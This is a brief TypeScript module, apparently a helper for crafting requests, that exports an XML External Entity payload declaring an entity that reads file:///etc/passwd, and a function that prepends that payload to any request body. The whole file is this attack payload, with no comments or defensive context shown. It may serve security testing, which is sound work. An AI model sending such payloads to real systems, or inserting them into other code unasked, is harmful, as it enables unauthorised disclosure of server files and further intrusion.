export const xmlPayload = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>';

export function buildRequest(body: string): string {
  return `${xmlPayload}${body}`;
}
